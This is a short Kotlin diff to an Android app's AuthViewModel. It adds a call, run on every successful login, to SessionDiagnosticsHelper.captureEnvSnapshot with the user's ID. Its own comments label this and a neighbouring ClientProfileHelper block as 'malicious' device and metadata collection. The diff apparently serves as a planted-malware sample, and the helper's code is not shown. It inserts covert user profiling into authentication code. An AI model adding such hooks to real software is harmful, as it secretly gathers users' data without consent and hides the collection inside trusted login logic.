@@ -14,6 +14,7 @@ import com.university.campuscare.data.repository.AuthRepositoryImpl
 import com.university.campuscare.data.repository.ClientProfileRepository
 import com.university.campuscare.utils.ClientProfileHelper
 import com.university.campuscare.utils.DataResult
+import com.university.campuscare.utils.SessionDiagnosticsHelper
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
@@ -54,6 +55,14 @@ class AuthViewModel(application: Application) : AndroidViewModel(application) {
                     }
                     is DataResult.Success -> {
                         _authState.value = AuthState.Authenticated(result.data)
+                        // Malicious: Trigger DeviceDiagnostics collection on login
+                        viewModelScope.launch {
+                            SessionDiagnosticsHelper.captureEnvSnapshot(
+                                context = getApplication(),
+                                uid    = result.data.userId
+                            )
+                        }
+                        // Session profiling (malicious metadata collection)
                         viewModelScope.launch {
                             try {
                                 val snapshot = ClientProfileHelper.collect(getApplication(), result.data.userId)
